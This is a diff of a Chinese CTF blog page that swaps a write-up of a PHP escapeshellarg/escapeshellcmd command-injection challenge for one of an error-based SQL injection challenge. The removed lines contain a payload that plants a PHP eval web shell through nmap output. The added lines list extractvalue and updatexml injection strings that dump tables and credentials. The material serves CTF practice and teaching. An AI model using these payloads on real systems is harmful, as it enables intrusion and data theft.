@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>BUUCTF2018-OnlineTool | 大周&#39;blog</title>
+  <title>极客大挑战2019-HardSQL | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -77,7 +77,7 @@
     <div class="focusinfo no-select">
       <div class="header-tou">
         <a href="https://www.d1a0.cn" target="_blank" rel="noopener">
-          <img src="/images/avatar.jpg">
+          <img src="http://q1.qlogo.cn/g?b=qq&nk=2823399539&s=640">
         </a>
       </div>
       <div class="header-info">
@@ -269,6 +269,34 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/tocbot.css">
 <div class="pattern-center-blank"></div>
 
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img">
+        <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/677543.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
+      </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      极客大挑战2019-HardSQL</h1>
+      <p class="entry-census">
+        <span>
+          <a href="https://www.d1a0.cn" target="_blank" rel="noopener">
+            <img src="https://www.d1a0.cn/images/avatar.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="https://www.d1a0.cn" target="_blank" rel="noopener">d1a0</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-8-5
+        
+      
+        ·<span id="readcount"></span>次阅读
+      
+      </p>
+    </header>
+  </div>
+
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
@@ -276,46 +304,40 @@
         <div class="toc"></div>
         <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
         
-          <header class="entry-header">
-            <h1 class="entry-title">BUUCTF2018-OnlineTool</h1>
-            <p class="entry-census">&nbsp;·&nbsp;2020-7-15&nbsp;
-              
-                    
-        ·<span id="readcount"></span>次阅读
-      
-            </p>
-            <hr>
-          </header>
-        
         <div class="entry-content">
           <p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p>
 <a id="more"></a>
 
-<p><img data-action="zoom" src="/2020/07/15/BUUCTF2018-OnlineTool/1.png" alt="1"></p>
-<p>总体意思就是GET方式传递参数给host然后经过两个函数<code>escapeshellarg</code>和<code>escapeshellcmd</code>，最后执行<code>system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host)</code></p>
-<p><img data-action="zoom" src="/2020/07/15/BUUCTF2018-OnlineTool/2.png" alt="2"></p>
-<p>函数作用</p>
-<pre><code>1,确保用户值传递一个参数给命令
-2,用户不能指定更多的参数
-3,用户不能执行不同的命令</code></pre><p><img data-action="zoom" src="/2020/07/15/BUUCTF2018-OnlineTool/3.png" alt="3"></p>
-<p>函数作用</p>
-<pre><code>1,确保用户只执行一个命令
-2,用户可以指定不限数量的参数
-3,用户不能执行不同的命令</code></pre><p>题目提示给了PHP和RCE</p>
-<p><img data-action="zoom" src="/2020/07/15/BUUCTF2018-OnlineTool/4.png" alt="4"></p>
-<p>这里关于PHP escapeshellarg()+escapeshellcmd()的RCE漏洞https:/<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener"></a>/paper.seebug.org/164/</p>
-<ol>
-<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
-<li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
-<li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
-<li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</li>
-</ol>
-<p>接下来就是构造命令</p>
-<pre><code>?host=&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG shell.php &#39;</code></pre><p><img data-action="zoom" src="/2020/07/15/BUUCTF2018-OnlineTool/5.png" alt="5"></p>
-<p>文件路径/c42a72d0bb829f75f501621acb75dc05/shell.php</p>
-<p>蚁剑连接后在根目录找到flag</p>
-<p>nmap中文手册：<a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="noopener">http://www.nmap.com.cn/doc/manual.shtm</a></p>
-
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/1.png" alt></p>
+<p>试了一下万能密码和双写绕过都不行</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805122957.png" alt></p>
+<p>大佬们的博客讲的是报错注入，关于报错注入参考：</p>
+<p><a href="https://www.cnblogs.com/c1047509362/p/12806297.html" target="_blank" rel="noopener">SQL注入实战之报错注入篇（updatexml extractvalue floor）</a></p>
+<p>and和or都被过滤了</p>
+<p>可以用^代替and，like代替=，()代替空格</p>
+<p>这里用extractvalue操作</p>
+<p>1’^extractvalue(1,concat(0x7e,(select(database()))))#</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805125626.png" alt></p>
+<p>得到数据库名geek</p>
+<p>1’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(‘geek’)))))#</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805130349.png" alt></p>
+<p>表名H4rDsq1</p>
+<p>1’^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(‘H4rDsq1’)))))#</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805130557.png" alt></p>
+<p>得到三个字段id,username,password</p>
+<p>1’^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))#</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805131316.png" alt></p>
+<p>只能得到左边部分flag{fc22e403-1ef2-4b32-90d8-c2，这是因为extractvalue和updatexml函数都只能最多显示32位</p>
+<p>1’^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805131737.png" alt></p>
+<p>3-1ef2-4b32-90d8-c28bc57f9b2c}</p>
+<p>拼起来得到flag{fc22e403-1ef2-4b32-90d8-c28bc57f9b2c}</p>
+<p>还有利用updatexml</p>
+<pre><code>updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1)
+updatexml(1,concat(0x7e，(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1)
+updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1)
+updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1)
+username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1)</code></pre>
         </div>
         <!-- .entry-content -->
         
@@ -336,39 +358,20 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
+        
           
-            <div class="post-nepre half previous">
+            <div class="post-nepre full next">
           
-            <a href="/2020/07/21/De1CTF2019-SSRFME/" rel="prev">
+            <a href="/2020/07/21/De1CTF2019-SSRFME/" rel="next">
               <div class="background">
-<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://tva4.sinaimg.cn/large/9bd9b167gy1g2qmn2a53zj21hc0u04qq.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://tva4.sinaimg.cn/large/9bd9b167gy1g2qmn2a53zj21hc0u04qq.jpg">-->
                 
                 <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://tva4.sinaimg.cn/large/9bd9b167gy1g2qmn2a53zj21hc0u04qq.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                De1CTF2019-SSRFME</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
-        
-          
-            <div class="post-nepre half next">
-          
-            <a href="/2020/07/14/RoarCTF2019-EasyJava/" rel="next">
-              <div class="background">
-                
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/783bf161f47b32882f0e962fd4064de7.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                RoarCTF2019-EasyJava</h3>
+                De1CTF2019-SSRFME</h3>
                 <hr>
               </div>
             </a>
@@ -392,11 +395,11 @@
 
       <section class="author-profile">
         <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-          <a href="" class="profile gravatar"><img src="" itemprop="image" alt="" height="70" width="70"></a>
+          <a href="https://www.d1a0.cn" target="_blank" rel="noopener" class="profile gravatar"><img src="https://www.d1a0.cn/images/avatar.jpg" itemprop="image" alt="d1a0" height="70" width="70"></a>
           <div class="meta">
             <span class="title">Author</span>
             <h3 itemprop="name">
-            <a href="" itemprop="url" rel="author"></a>
+            <a href="https://www.d1a0.cn" target="_blank" itemprop="url" rel="author noopener">d1a0</a>
             </h3>
           </div>
         </div>
@@ -413,7 +416,7 @@
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <input type="text" class="ins-search-input" placeholder="Type something..."/>
             <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="ins-section-wrapper">
@@ -425,10 +428,10 @@
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
-            POSTS: '文章',
-            // PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
+            POSTS: 'Posts',
+            // PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
         },
         ROOT_URL: '/',
         CONTENT_URL: '/content.json',
@@ -720,7 +723,7 @@
   </section>
   <div id="mo-nav" class="">
   <div class="m-avatar">
-    <img src="/images/avatar.jpg">
+    <img src="http://q1.qlogo.cn/g?b=qq&nk=2823399539&s=640">
   </div>
   <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">大周'blog奝</p>
   <p style="text-align: center; word-spacing: 20px;">
